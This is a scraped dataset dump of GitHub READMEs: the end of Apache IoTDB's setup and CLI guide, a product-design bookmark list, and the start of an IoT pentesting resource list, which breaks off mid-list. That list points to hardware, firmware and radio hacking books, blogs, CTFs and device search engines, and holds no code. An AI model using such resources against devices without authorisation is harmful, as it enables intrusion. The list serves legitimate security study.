client (for more details, read client-cpp's readme file.)\nthen the binary version (including both server and cli) can be found at distribution/target/apache-iotdb-{project.version}-all-bin.zip\nnote: directories \"thrift/target/generated-sources/thrift\", \"thrift-sync/target/generated-sources/thrift\", \"thrift-cluster/target/generated-sources/thrift\" and \"antlr/target/generated-sources/antlr4\" need to be added to sources roots to avoid compilation errors in the ide.\nin idea, you just need to right click on the root project name and choose \"maven->reload project\" after you run mvn package successfully.\nconfigurations\nconfiguration files are under \"conf\" folder\nenvironment config module (iotdb-env.bat, iotdb-env.sh),\nsystem config module (iotdb-engine.properties)\nlog config module (logback.xml).\nfor more information, please see config manual.\nstart\nyou can go through the following steps to test the installation, if there is no error returned after execution, the installation is completed.\nstart iotdb\nusers can start iotdb by the start-server script under the sbin folder.\n# unix/os x\n> nohup sbin/start-server.sh >/dev/null 2>&1 &\nor\n> nohup sbin/start-server.sh -c <conf_path> -rpc_port <rpc_port> >/dev/null 2>&1 &\n# windows\n> sbin\\start-server.bat -c <conf_path> -rpc_port <rpc_port>\n\"-c\" and \"-rpc_port\" are optional.\noption \"-c\" specifies the system configuration file directory.\noption \"-rpc_port\" specifies the rpc port.\nif both option specified, the rpc_port will overrides the rpc_port in conf_path.\nuse iotdb\nuse cli\niotdb offers different ways to interact with server, here we introduce the basic steps of using cli tool to insert and query data.\nafter installing iotdb, there is a default user 'root', its default password is also 'root'. users can use this default user to login cli to use iotdb. the startup script of cli is the start-cli script in the folder sbin. when executing the script, user should assign ip, port, user_name and password. the default parameters are \"-h 127.0.0.1 -p 6667 -u root -pw -root\".\nhere is the command for starting the cli:\n# unix/os x\n> sbin/start-cli.sh -h 127.0.0.1 -p 6667 -u root -pw root\n# windows\n> sbin\\start-cli.bat -h 127.0.0.1 -p 6667 -u root -pw root\nthe command line cli is interactive, so you should see the welcome logo and statements if everything is ready:\n_____ _________ ______ ______\n|_ _| | _ _ ||_ _ `.|_ _ \\\n| | .--.|_/ | | \\_| | | `. \\ | |_) |\n| | / .'`\\ \\ | | | | | | | __'.\n_| |_| \\__. | _| |_ _| |_.' /_| |__) |\n|_____|'.__.' |_____| |______.'|_______/ version x.x.x\niotdb> login successfully\niotdb>\nbasic commands for iotdb\nnow, let us introduce the way of creating timeseries, inserting data and querying data.\nthe data in iotdb is organized as timeseries. each timeseries includes multiple data-time pairs, and is owned by a storage group. before defining a timeseries, we should define a storage group using set storage group first, and here is an example:\niotdb> set storage group to root.ln\nwe can also use show storage group to check the storage group being created:\niotdb> show storage group\n+-------------+\n|storage group|\n+-------------+\n| root.ln|\n+-------------+\ntotal line number = 1\nafter the storage group is set, we can use create timeseries to create a new timeseries. when creating a timeseries, we should define its data type and the encoding scheme. here we create two timeseries:\niotdb> create timeseries root.ln.wf01.wt01.status with datatype=boolean, encoding=plain\niotdb> create timeseries root.ln.wf01.wt01.temperature with datatype=float, encoding=rle\nin order to query the specific timeseries, we can use show timeseries . represent the location of the timeseries. the default value is \"null\", which queries all the timeseries in the system(the same as using \"show timeseries root\"). here are some examples:\nquerying all timeseries in the system:\niotdb> show timeseries\n+-----------------------------+-----+-------------+--------+--------+-----------+----+----------+\n| timeseries|alias|storage group|datatype|encoding|compression|tags|attributes|\n+-----------------------------+-----+-------------+--------+--------+-----------+----+----------+\n|root.ln.wf01.wt01.temperature| null| root.ln| float| rle| snappy|null| null|\n| root.ln.wf01.wt01.status| null| root.ln| boolean| plain| snappy|null| null|\n+-----------------------------+-----+-------------+--------+--------+-----------+----+----------+\ntotal line number = 2\nquerying a specific timeseries(root.ln.wf01.wt01.status):\niotdb> show timeseries root.ln.wf01.wt01.status\n+------------------------+-----+-------------+--------+--------+-----------+----+----------+\n| timeseries|alias|storage group|datatype|encoding|compression|tags|attributes|\n+------------------------+-----+-------------+--------+--------+-----------+----+----------+\n|root.ln.wf01.wt01.status| null| root.ln| boolean| plain| snappy|null| null|\n+------------------------+-----+-------------+--------+--------+-----------+----+----------+\ntotal line number = 1\ninsert timeseries data is a basic operation of iotdb, you can use \u2018insert\u2019 command to finish this. before insertion, you should assign the timestamp and the suffix path name:\niotdb> insert into root.ln.wf01.wt01(timestamp,status) values(100,true);\niotdb> insert into root.ln.wf01.wt01(timestamp,status,temperature) values(200,false,20.71)\nthe data that you have just inserted will display as follows:\niotdb> select status from root.ln.wf01.wt01\n+------------------------+------------------------+\n| time|root.ln.wf01.wt01.status|\n+------------------------+------------------------+\n|1970-01-01t00:00:00.100z| true|\n|1970-01-01t00:00:00.200z| false|\n+------------------------+------------------------+\ntotal line number = 2\nyou can also query several timeseries data using one sql statement:\niotdb> select * from root.ln.wf01.wt01\n+------------------------+-----------------------------+------------------------+\n| time|root.ln.wf01.wt01.temperature|root.ln.wf01.wt01.status|\n+------------------------+-----------------------------+------------------------+\n|1970-01-01t00:00:00.100z| null| true|\n|1970-01-01t00:00:00.200z| 20.71| false|\n+------------------------+-----------------------------+------------------------+\ntotal line number = 2\nto change the time zone in cli, you can use the following sql:\niotdb> set time_zone=+08:00\ntime zone has set to +08:00\niotdb> show time_zone\ncurrent time zone: asia/shanghai\nadd then the query result will show using the new time zone.\niotdb> select * from root.ln.wf01.wt01\n+-----------------------------+-----------------------------+------------------------+\n| time|root.ln.wf01.wt01.temperature|root.ln.wf01.wt01.status|\n+-----------------------------+-----------------------------+------------------------+\n|1970-01-01t08:00:00.100+08:00| null| true|\n|1970-01-01t08:00:00.200+08:00| 20.71| false|\n+-----------------------------+-----------------------------+------------------------+\ntotal line number = 2\nthe commands to exit the cli are:\niotdb> quit\nor\niotdb> exit\nfor more information about the commands supported by iotdb sql, please see sql reference.\nstop iotdb\nthe server can be stopped with \"ctrl-c\" or the following script:\n# unix/os x\n> sbin/stop-server.sh\n# windows\n> sbin\\stop-server.bat\nonly build server\nunder the root path of iotdb:\n> mvn clean package -pl server -am -dskiptests\nafter being built, the iotdb server is located at the folder: \"server/target/iotdb-server-{project.version}\".\nonly build cli\nunder the root path of iotdb:\n> mvn clean package -pl cli -am -dskiptests\nafter being built, the iotdb cli is located at the folder \"cli/target/iotdb-cli-{project.version}\".\nusage of csv import and export tool\nsee usage of csv import and export tool\nfrequent questions for compiling\nsee frequent questions when compiling the source code\ncontact us\nqq group\napache iotdb user group: 659990460\nwechat group\nadd friend: tietouqiao or liutaohua001, and then we'll invite you to the group.\nslack\nhttps://join.slack.com/t/apacheiotdb/shared_invite/zt-qvso1nj8-7715tpysztzqmyg5qxqwpg\nsee join the community for more!", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000068, "year": null}, {"Unnamed: 0": 69, "autor": 69, "date": null, "content": "Awesome Product Design\nA collection of bookmarks, resources, articles for product designers.\nDigital product design is an iterative design process to solve a functional problem with a formal solution. A digital product designer identifies a real problem, offers the best possible solution, and launch it to a market that is showing demand for that particular solution.\nFeel free to add something interesting by pull request.\nContents\nResearch\nUX\nUI\nVisual\nPrototype\nAccessibility\nWriting\nData\nIoT\nResearch\nMethods\nResearch Plan\nSmashing Magazine - The UX Research Plan That Stakeholders Love.\nNN Group - Project Management for User Research: The Plan.\nInteraction Design - One Page User Research Plan.\nUser Interview\nNN Group - Despite many weaknesses, interviews are a valuable method for exploratory user research.\nUXDesign.cc - How to Get the Most Out of User Interviews.\nStakeholder Interviews\nBoxes and Arrows - Cheat Sheet For Interviewing Stakeholders.\nUX Apprentice - Stakeholder Interview Template.\nInteraction Design - Preparing for UX Stakeholder Interviews.\nResearch Synthesis\nUX Movement - How to Turn User Research into Usable Data.\nSlideShare - Design Research Synthesis.\nMedium - Using Trello for User Research Synthesis.\nTuts+ - How to Prepare and Use an Affinity Diagram.\nMedium - Affinity Diagrams: Tips and Tricks.\nCompetitive Analysis\nXtensio - How To: Create A Competitive Analysis.\nHootsuite - Competitive Analysis Template To Help You Outsmart The Competition.\nJob to be Done\nIntercom - Designing features using Job Stories.\nJTBD - Replacing The User Story With The Job Story.\nPersonas\nUsability.Gov - The purpose of personas is to create reliable and realistic representations of your key audience.\nUX Mag - Personas: The Foundation of a Great User Experience.\nTuts+ - Defining And Applying Personas to UX Design.\nEmpathy Map\nUX Pin - The Practical Guide to Empathy Maps: 10-Minute User Personas.\nBoagworld - Adapting empathy maps for UX design.\nStoryboard\nUX Magazine - Storyboarding in the Software Design Process.\nMedium - Storyboarding in UX Design.\nNN Group - When and How to Create Customer Journey Maps.\nUX Lady - Experience maps, user journeys and more.\nSmashing Magazine - All You Need To Know About Customer Journey Mapping.\nMedium - How to build an experience map.\nArticles\nSmashing Magazine - The Rainbow Spreadsheet: A Collaborative Lean UX Research Tool.\nCoglode - Bite-size behavioral research analysis.\nTesting\nUser Testing - Unlock customer insights and increase your revenue.\nOptimal Workshop - User Research Platform that helps you and your team make design decisions with confidence.\nMeasure Success - How Do You Measure the Success (or Failure) - of Your UX Design?.\nLookback - Simple, powerful user research.\nFull Story - What do you want to know about your customer experience?.\nDesinion - Make smart and informed design decisions for your company, or your client's company.\nSurvey Monkey - Turn instincts into insights.\nEtnio - Intercept Real People for User Research.\nUX\nGuidelines\nThe UX Bookmark - Collection of the best UX websites from across the globe.\nGov.Uk - Helping government teams create and run great digital services.\nMethods 18F - Collection of tools to bring human-centered design into your project.\nGuides 18F - 18F Guides is the repository for best practices across our teams.\nUsability.Gov - Improving the User Experience.\nMedial Lab Amsterdam - Design method toolkit.\nDesign Kit IDEO - Step-by-step guide to unleashing your creativity.\nGamestorming - Gamestorming is a set of co-creation tools used by innovators around the world.\nArticles\nUX Magazine - UX Magazine is a free community resource exploring all facets of experience design.\nUX Both - The UX Booth is a publication by and for the user experience community.\nUX Mastery - We help user experience professionals get started and get better.\nUX Myths - Build your product based on evidence, not false beliefs.\nA List Apart - List Apart explores the design, development, and meaning of web content.\n52 Weeks of UX - Discourse on the process of designing for real people.\nUX Pin - Guides, articles and ebooks that explore all facets of UX Design.\nThe IxD Library - Collection of materials related to Interaction Design.\nLukeW - Publications on the critical details and big picture behind digital product design.\nNN Group - Evidence-Based User Experience Research, Training, and Consulting.\nInformation Design - InfoDesign Hand-picked since 1997.\nIntercom - Design, Customer Success, & Startup Blog.\nUXDesign.cc - User Experience, Usability, Product Design. Follow the UXDesign.cc.\nUX Reactions - Fun stuff.\nTools\nUX Recipe - This project is a personal manifesto against the objectification of the term \"UX\".\nUX Checklist - UX Project Checklist.\nUX Stackexchange - UX Stack Exchange is a question and answer site.\nUI\nGuidelines\nAnt Design - An UI design language for enterprise applications.\niOS Guidelines - Get in-depth information and UI resources for designing great apps that integrate seamlessly with Apple platforms.\nGoogle Material - Material Design is a unified system that combines theory, resources, and tools for crafting digital experiences.\nGoogle Design - Google Design is a cooperative effort led by a group of designers, writers, and developers at Google.\nFacebook Design - Collection of articles, videos, and resources made by designers at Facebook.\nUsTwo - Pixel Perfect Precision Handbook 3.\nVinsol - Tips for Designers: from a Developer.\nInspiration\nPttrns - The mother of all design resources.\nCall To Idea - Light up your imagination!.\nAndroid Niceties - Aiming to provide inspiration and insight into Android UI conventions.\nLovely UI - Collection of mobile UI elements.\nBrian Lovin - Visual exploration of the best products.\nInspired UI - iOS Mobile Apps Design Patterns.\nSloppy UI - It's all about intellectual honesty, not trolling.\nTools\nPattern Lab - Create atomic design systems with Pattern Lab.\nHuge - Tool to make creating and maintaining styleguides easy.\nFigma Bootstrap 5 UI Kit - UI Kit comprising 300+ organized Bootstrap 5 components built with atomic design system & auto layout.\nSketch Bootstrap 5 UI Kit - UI Kit comprising 300+ organized Bootstrap 5 components built with atomic design system & smart layout.\nVisual\nResources\nDesign Principles FTW - The biggest collection of Design Principles on the Internet.\nAwesome Design Systems - Curated list of design systems, patterns libraries, and everything in between.\nAwesome Sketch - Curated list of awesome Sketch videos, articles, plugins, whatever, for designers, developers, or neither.\nIcons\nUse Iconic - Meet Iconic. The definitive icon set designed for the modern web.\nIcon Finder - Search through 1,739,045 icons or browse 42,226 icon sets.\nWe Love Icon Font - This is a free & open source icon fonts hosting service.\nThe Noun Project - Icons for everything.\nIconmonstr - Discover 3847+ free simple icons in 263 collections.\nFont Foundries\nOpen Foundry - New platform for open-source fonts in a noise-free environment.\nUse & Modify - Provide a contemporary set of fonts distributed under libre or open source licences, hand picked by a typography and free culture lover.\nFont Fabric - Fontfabric is an independent type foundry.\nFont Squirrel - Free Font Utopia.\nPlay Type - Browse through our selection of more than a hundred fonts and nearly 500 different font weights.\nIdentyfont - Identify a font by answering questions about key features.\nTypography\nNN Group - Typography Terms Cheat Sheet.\nColors\nCoolors - The super fast color schemes generator!.\nColour Lovers - Creative community.\nColor Hunt - Color Hunt is a social platform for everyone who love colors.\nBrand Colors - 1100+ color collection available in sass, less, stylus and css.\nStock Images\nUnsplash - Free (do whatever you want) - high-resolution photos.\nStockSnap - Hundreds of high resolution images added weekly.\nPixbay - Free images and videos you can use anywhere.\nJay Mantry - Free pics (CC0).\nGet Refe - Royalty-free, high-quality, Real Life photos.\nISO Republic - ISO Republic provides free stock photos for creative professionals.\nAll The Free Stock - Get all the Free Stock Images, Videos, Music and Icons in one location.\nPexels - Free stock images in a range of styles including filtered, natural, and commercial.\nunDraw - Open-source illustrations for every project you can imagine and create.\nStock Videos\nVimeo - Royalty Free Stock Video for Free Personal, Corporate or Commercial Use.\nTools\nPolarr - Photo Editor.\nLicecap - Simple animated screen captures.\nHand Brake - HandBrake is a tool for converting video from nearly any format to a selection of modern, widely supported codecs.\nPrototype\nArticles\nThe 12 Principles - The 12 basic principles of animation were developed by the \u2018old men\u2019 of Walt Disney Studios.\nHoverstat - The home of alternative digital design.\nMicrointeractions - Designing with Details.\nMotion UI Design - Resources for inspiration, lists of software, libraries and other stuff related to Motion UI design, animations and transitions.\nSoftwares\nPop - POP helps you transform your pen and paper ideas into an interactive iPhone or Android prototype.\nInvision - The world's leading prototyping, collaboration & workflow platform.\nMarvel - Simple design, prototyping and collaboration.\nFlinto - Flinto lets designers quickly make interactive prototypes of their mobile, desktop, or web apps.\nOrigami Studio - Explore, iterate, and test your ideas.\nFramer - All-in-one design workflow.\nProto - Create fully-interactive high-fidelity prototypes that look and work exactly like your app should. No coding required.\nProtoPie - ProtoPie is the easiest prototyping tool to build advanced, highly interactive prototypes.\nTools\nLottie - Easily add high-quality animation to any native app.\nKeynotopia - Keynotopia transforms Keynote and PowerPoint into the best rapid prototyping tools for creating mobile, web and desktop UI mockups.\nAccessibility\nArticles\nGov.Uk - Making your service accessible: an introduction.\nSmashing Magazine - Color Contrast And Why You Should Rethink It.\nMedium - Accessibility for designers. Mind your RGBs.\nWeb Credible - Visual design and color accessibility.\nA List Apart - Easy Color Contrast Testing.\nTools\nWAVE - Web Accessibility Evaluation Tool.\nContrast Ratio - A tool to calculate the contrast ratio between any two valid CSS colors.\nSnook - Colour Contrast Check.\nWriting\nGoogle trends - Stories trending now.\nGoogle Ngram - Enter phrases into the Google Books Ngram Viewer, it displays a graph showing how those phrases have occurred in a corpus of books.\nHemingway - Hemingway App makes your writing bold and clear.\nReadable - You have 7 seconds to grab someone's attention. Readable.io helps you cut out the noise.\nThe Writer - How readable is your writing?.\nTaskade - Collaborative editor and outliner.\nData\nLondon Datastore - The London Datastore is a free and open data-sharing portal.\nYouGov - We believe in the power of participation.\nData.Gov - Find data published by government departments and agencies, public bodies and local authorities.\nThe Tate Collection - Here we present the metadata for around 70,000 artworks.\nNASA - We're Setting Data, Code and APIs free.\nIoT\nArticles\nIoT Weekly News - Subscribe to hand picked articles by Justin Grammens on the Internet of Things.\nIoT Agenda - Design an IoT user experience, not an IoT product.\nIoT For All - Designing the Internet of Things \u2013 5 Key Principles.\nTools\nNode RED - Low-based programming for the Internet of Things.", "link": "https://github.com/ttt30ga/awesome-product-design", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "awesome product design\na collection of bookmarks, resources, articles for product designers.\ndigital product design is an iterative design process to solve a functional problem with a formal solution. a digital product designer identifies a real problem, offers the best possible solution, and launch it to a market that is showing demand for that particular solution.\nfeel free to add something interesting by pull request.\ncontents\nresearch\nux\nui\nvisual\nprototype\naccessibility\nwriting\ndata\niot\nresearch\nmethods\nresearch plan\nsmashing magazine - the ux research plan that stakeholders love.\nnn group - project management for user research: the plan.\ninteraction design - one page user research plan.\nuser interview\nnn group - despite many weaknesses, interviews are a valuable method for exploratory user research.\nuxdesign.cc - how to get the most out of user interviews.\nstakeholder interviews\nboxes and arrows - cheat sheet for interviewing stakeholders.\nux apprentice - stakeholder interview template.\ninteraction design - preparing for ux stakeholder interviews.\nresearch synthesis\nux movement - how to turn user research into usable data.\nslideshare - design research synthesis.\nmedium - using trello for user research synthesis.\ntuts+ - how to prepare and use an affinity diagram.\nmedium - affinity diagrams: tips and tricks.\ncompetitive analysis\nxtensio - how to: create a competitive analysis.\nhootsuite - competitive analysis template to help you outsmart the competition.\njob to be done\nintercom - designing features using job stories.\njtbd - replacing the user story with the job story.\npersonas\nusability.gov - the purpose of personas is to create reliable and realistic representations of your key audience.\nux mag - personas: the foundation of a great user experience.\ntuts+ - defining and applying personas to ux design.\nempathy map\nux pin - the practical guide to empathy maps: 10-minute user personas.\nboagworld - adapting empathy maps for ux design.\nstoryboard\nux magazine - storyboarding in the software design process.\nmedium - storyboarding in ux design.\nnn group - when and how to create customer journey maps.\nux lady - experience maps, user journeys and more.\nsmashing magazine - all you need to know about customer journey mapping.\nmedium - how to build an experience map.\narticles\nsmashing magazine - the rainbow spreadsheet: a collaborative lean ux research -----> tool !!! .\ncoglode - bite-size behavioral research analysis.\ntesting\nuser testing - unlock customer insights and increase your revenue.\noptimal workshop - user research platform that helps you and your team make design decisions with confidence.\nmeasure success - how do you measure the success (or failure) - of your ux design?.\nlookback - simple, powerful user research.\nfull story - what do you want to know about your customer experience?.\ndesinion - make smart and informed design decisions for your company, or your client's company.\nsurvey monkey - turn instincts into insights.\netnio - intercept real people for user research.\nux\nguidelines\nthe ux bookmark - collection of the best ux websites from across the globe.\ngov.uk - helping government teams create and run great digital services.\nmethods 18f - collection of tools to bring human-centered design into your project.\nguides 18f - 18f guides is the repository for best practices across our teams.\nusability.gov - improving the user experience.\nmedial lab amsterdam - design method toolkit.\ndesign kit ideo - step-by-step guide to unleashing your creativity.\ngamestorming - gamestorming is a set of co-creation tools used by innovators around the world.\narticles\nux magazine - ux magazine is a free community resource exploring all facets of experience design.\nux both - the ux booth is a publication by and for the user experience community.\nux mastery - we help user experience professionals get started and get better.\nux myths - build your product based on evidence, not false beliefs.\na list apart - list apart explores the design, development, and meaning of web content.\n52 weeks of ux - discourse on the process of designing for real people.\nux pin - guides, articles and ebooks that explore all facets of ux design.\nthe ixd library - collection of materials related to interaction design.\nlukew - publications on the critical details and big picture behind digital product design.\nnn group - evidence-based user experience research, training, and consulting.\ninformation design - infodesign hand-picked since 1997.\nintercom - design, customer success, & startup blog.\nuxdesign.cc - user experience, usability, product design. follow the uxdesign.cc.\nux reactions - fun stuff.\ntools\nux recipe - this project is a personal manifesto against the objectification of the term \"ux\".\nux checklist - ux project checklist.\nux stackexchange - ux stack exchange is a question and answer site.\nui\nguidelines\nant design - an ui design language for enterprise applications.\nios guidelines - get in-depth information and ui resources for designing great apps that integrate seamlessly with apple platforms.\ngoogle material - material design is a unified system that combines theory, resources, and tools for crafting digital experiences.\ngoogle design - google design is a cooperative effort led by a group of designers, writers, and developers at google.\nfacebook design - collection of articles, videos, and resources made by designers at facebook.\nustwo - pixel perfect precision handbook 3.\nvinsol - tips for designers: from a developer.\ninspiration\npttrns - the mother of all design resources.\ncall to idea - light up your imagination!.\nandroid niceties - aiming to provide inspiration and insight into android ui conventions.\nlovely ui - collection of mobile ui elements.\nbrian lovin - visual exploration of the best products.\ninspired ui - ios mobile apps design patterns.\nsloppy ui - it's all about intellectual honesty, not trolling.\ntools\npattern lab - create atomic design systems with pattern lab.\nhuge - tool to make creating and maintaining styleguides easy.\nfigma bootstrap 5 ui kit - ui kit comprising 300+ organized bootstrap 5 components built with atomic design system & auto layout.\nsketch bootstrap 5 ui kit - ui kit comprising 300+ organized bootstrap 5 components built with atomic design system & smart layout.\nvisual\nresources\ndesign principles ftw - the biggest collection of design principles on the internet.\nawesome design systems - curated list of design systems, patterns libraries, and everything in between.\nawesome sketch - curated list of awesome sketch videos, articles, plugins, whatever, for designers, developers, or neither.\nicons\nuse iconic - meet iconic. the definitive icon set designed for the modern web.\nicon finder - search through 1,739,045 icons or browse 42,226 icon sets.\nwe love icon font - this is a free & open source icon fonts hosting service.\nthe noun project - icons for everything.\niconmonstr - discover 3847+ free simple icons in 263 collections.\nfont foundries\nopen foundry - new platform for open-source fonts in a noise-free environment.\nuse & modify - provide a contemporary set of fonts distributed under libre or open source licences, hand picked by a typography and free culture lover.\nfont fabric - fontfabric is an independent type foundry.\nfont squirrel - free font utopia.\nplay type - browse through our selection of more than a hundred fonts and nearly 500 different font weights.\nidentyfont - identify a font by answering questions about key features.\ntypography\nnn group - typography terms cheat sheet.\ncolors\ncoolors - the super fast color schemes generator!.\ncolour lovers - creative community.\ncolor hunt - color hunt is a social platform for everyone who love colors.\nbrand colors - 1100+ color collection available in sass, less, stylus and css.\nstock images\nunsplash - free (do whatever you want) - high-resolution photos.\nstocksnap - hundreds of high resolution images added weekly.\npixbay - free images and videos you can use anywhere.\njay mantry - free pics (cc0).\nget refe - royalty-free, high-quality, real life photos.\niso republic - iso republic provides free stock photos for creative professionals.\nall the free stock - get all the free stock images, videos, music and icons in one location.\npexels - free stock images in a range of styles including filtered, natural, and commercial.\nundraw - open-source illustrations for every project you can imagine and create.\nstock videos\nvimeo - royalty free stock video for free personal, corporate or commercial use.\ntools\npolarr - photo editor.\nlicecap - simple animated screen captures.\nhand brake - handbrake is a tool for converting video from nearly any format to a selection of modern, widely supported codecs.\nprototype\narticles\nthe 12 principles - the 12 basic principles of animation were developed by the \u2018old men\u2019 of walt disney studios.\nhoverstat - the home of alternative digital design.\nmicrointeractions - designing with details.\nmotion ui design - resources for inspiration, lists of software, libraries and other stuff related to motion ui design, animations and transitions.\nsoftwares\npop - pop helps you transform your pen and paper ideas into an interactive iphone or android prototype.\ninvision - the world's leading prototyping, collaboration & workflow platform.\nmarvel - simple design, prototyping and collaboration.\nflinto - flinto lets designers quickly make interactive prototypes of their mobile, desktop, or web apps.\norigami studio - explore, iterate, and test your ideas.\nframer - all-in-one design workflow.\nproto - create fully-interactive high-fidelity prototypes that look and work exactly like your app should. no coding required.\nprotopie - protopie is the easiest prototyping tool to build advanced, highly interactive prototypes.\ntools\nlottie - easily add high-quality animation to any native app.\nkeynotopia - keynotopia transforms keynote and powerpoint into the best rapid prototyping tools for creating mobile, web and desktop ui mockups.\naccessibility\narticles\ngov.uk - making your service accessible: an introduction.\nsmashing magazine - color contrast and why you should rethink it.\nmedium - accessibility for designers. mind your rgbs.\nweb credible - visual design and color accessibility.\na list apart - easy color contrast testing.\ntools\nwave - web accessibility evaluation tool.\ncontrast ratio - a tool to calculate the contrast ratio between any two valid css colors.\nsnook - colour contrast check.\nwriting\ngoogle trends - stories trending now.\ngoogle ngram - enter phrases into the google books ngram viewer, it displays a graph showing how those phrases have occurred in a corpus of books.\nhemingway - hemingway app makes your writing bold and clear.\nreadable - you have 7 seconds to grab someone's attention. readable.io helps you cut out the noise.\nthe writer - how readable is your writing?.\ntaskade - collaborative editor and outliner.\ndata\nlondon datastore - the london datastore is a free and open data-sharing portal.\nyougov - we believe in the power of participation.\ndata.gov - find data published by government departments and agencies, public bodies and local authorities.\nthe tate collection - here we present the metadata for around 70,000 artworks.\nnasa - we're setting data, code and apis free.\niot\narticles\niot weekly news - subscribe to hand picked articles by justin grammens on the internet of things.\niot agenda - design an iot user experience, not an iot product.\niot for all - designing the internet of things \u2013 5 key principles.\ntools\nnode red - low-based programming for the internet of things.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000069, "year": null}, {"Unnamed: 0": 84, "autor": 84, "date": null, "content": "Approach Methodology\n1. Network\n2. Web (Front & Backend and Web services)\n3. Mobile App (Android & iOS)\n4. Wireless Connectivity (Zigbee , WiFi , Bluetooth , etc)\n5. Firmware Pentesting (OS of IoT Devices)\n6. Hardware Hacking & Fault Injections & SCA Attacks\n7. Storage Medium\n8. I/O Ports\nContents\nIoT Security information\nIoT Security Chat groups\nBooks\nBlogs\nCheatsheets\nSearch Engines\nCTF\nYoutube\nExploitation Tools\nIoT Pentesting OSes\nIoT Vulnerabilites Checking Guides\nIoT Labs\nAwesome IoT Pentesting Guides\nNetwork\nWeb IoT Message Protocols\nMQTT\nCoAP\nMobile app\nMobile security (Android & iOS)\nWireless Protocols\nRADIO HACKING STARTING GUIDE\nCellular Hacking GSM BTS\nZigbee\nBluetooth\nFirmware\nReverse Engineering Tools\nOnline Assemblers\nARM\nPentesting Firmwares and emulating and analyzing\nFirmware samples to pentest\nBootloader\nHardware\nIoT Hardware Intro\n[IoT Hardware hacking Intro]\nRequired hardware to pentest IoT\nHardware interfaces\nSPI\nUART\nJTAG\nSideChannel Attacks & Glitching attacks\nStorage Medium\nTo seen Hacked devices\nhttps://blog.exploitee.rs/2018/10/\nhttps://www.exploitee.rs/\nhttps://forum.exploitee.rs/\nYour Lenovo Watch X Is Watching You & Sharing What It Learns\nYour Smart Scale is Leaking More than Your Weight: Privacy Issues in IoT\nSmart Bulb Offers Light, Color, Music, and\u2026 Data Exfiltration?\nBesder-IPCamera analysis\nSmart Lock\nSubaru Head Unit Jailbreak\nJeep Hack\nDropcam hacking\nPrinter Hacking live sessions - gamozolabs\nChat groups for IoT Security\nIoTSecurity101 Telegram - https://t.me/iotsecurity1011\nIoTSecurity101 Reddit - https://www.reddit.com/r/IoTSecurity101/\nIoTSecurity101 Discord - https://discord.gg/EH9dxT9\nhardware hacking Telegram - https://t.me/hardwareHackingBrasil\nNForceIT Telegram - https://t.me/joinchat/JAMxOg5YzdkGjcF3HmNgQw\nRFID Discord group - https://discord.gg/Z43TrcVyPr\nICS Discord group - https://discord.com/invite/CmDDsFK\nBooks For IoT Pentesting\nThe Firmware Handbook (Embedded Technology) 1st Edition by Jack Ganssle - 2004\nHardware Hacking: Have Fun while Voiding your Warranty 1st Edition - 2004\nLinksys WRT54G Ultimate Hacking 1st Edition by Paul Asadoorian - 2007\nApplied Cyber Security and the Smart Grid: Implementing Security Controls into the Modern Power Infrastructure by Eric D. Knapp , Raj Samani -2013\nHacking the Xbox-An Introduction to Reverse Engineering HACKING THE XBOX by Andrew \u201cbunnie\u201d Huang - Openbook - 2013\nAndroid Hacker's Handbook by Joshua J. Drake - 2014\nThe Art of Pcb Reverse Engineering: Unravelling the Beauty of the Original Design - 2015\nAbusing the Internet of Things: Blackouts, Freakouts, and Stakeouts 1st Edition, by Nitesh Dhanjani - 2015\nLearning Linux Binary Analysis By Ryan \"elfmaster\" O'Neill - 2016\nCar hacker's handbook by Craig Smith - 2016\nIoT Penetration Testing Cookbook By Aaron Guzman , Aditya Gupta - 2017\nInside Radio: An Attack and Defense Guide by Authors: Yang, Qing, Huang, Lin -2018\nPentest Hardware - Openbook -2018\nGray Hat Hacking: The Ethical Hacker's Handbook, Fifth Edition 5th Edition by by Daniel Regalado , Shon Harris , Allen Harper , Chris Eagle , Jonathan Ness , Branko Spasojevic , Ryan Linn , Stephen Sims - 2018\nThe Hardware Hacking Handbook: Breaking Embedded Security with Hardware Attacks Front Cover Jasper van Woudenberg, Colin O'Flynn - 2021\nPractical IoT Hacking-The Definitive Guide to Attacking the Internet of Things by Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Woods - 2021\nInternet of Things Security Encyclopedia - Openbook\nBlogs for iotpentest\nhttps://payatu.com/blog/\nhttps://raelize.com/blog/\nhttp://jcjc-dev.com/\nhttps://w00tsec.blogspot.in/\nhttp://www.devttys0.com/\nhttps://wrongbaud.github.io/\nhttps://embeddedbits.org/\nhttps://www.rtl-sdr.com/\nhttps://keenlab.tencent.com/en/\nhttps://courk.cc/\nhttps://iotsecuritywiki.com/\nhttps://cybergibbons.com/\nhttp://firmware.re/\nhttp://blog.k3170makan.com/\nhttps://blog.tclaverie.eu/\nhttp://blog.besimaltinok.com/category/iot-pentest/\nhttps://ctrlu.net/\nhttp://iotpentest.com/\nhttps://blog.attify.com\nhttps://duo.com/decipher/\nhttp://www.sp3ctr3.me\nhttp://blog.0x42424242.in/\nhttps://dantheiotman.com/\nhttps://blog.danman.eu/\nhttps://quentinkaiser.be/\nhttps://blog.quarkslab.com\nhttps://blog.ice9.us/\nhttps://labs.f-secure.com/\nhttps://mg.lol/blog/\nhttps://cjhackerz.net/\nhttps://github.com/sponsors/bunnie/\nhttps://iotmyway.wordpress.com/\nhttps://www.synacktiv.com/publications.html\nhttp://blog.cr4.sh/\nhttps://ktln2.org/\nhttps://naehrdine.blogspot.com/\nAwesome CheatSheets\nHardware Hacking\nNmap\nSearch Engines for IoT Openly devices\nShodan\nFOFA\nCensys\nZoomeye\nONYPHE\nCTF For IoT And Embeddded\nhttps://github.com/hackgnar/ble_ctf\nhttps://www.microcorruption.com/\nhttps://github.com/Riscure/Rhme-2016\nhttps://github.com/Riscure/Rhme-2017\nhttps://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html\nhttps://github.com/scriptingxss/IoTGoat\nYouTube Channels for IoT Pentesting\nLiveoverflow\nBinary Adventure\nEEVBlog\nJackkTutorials\nCraig Smith\niotpentest [Mr-IoT]\nBesim ALTINOK - IoT - Hardware - Wireless\nGhidra Ninja\nCyber Gibbons\nScanline\nAaron Christophel\nVehicle Security Resources\nhttps://github.com/jaredthecoder/awesome-vehicle-security\nIoT Vulnerabilites 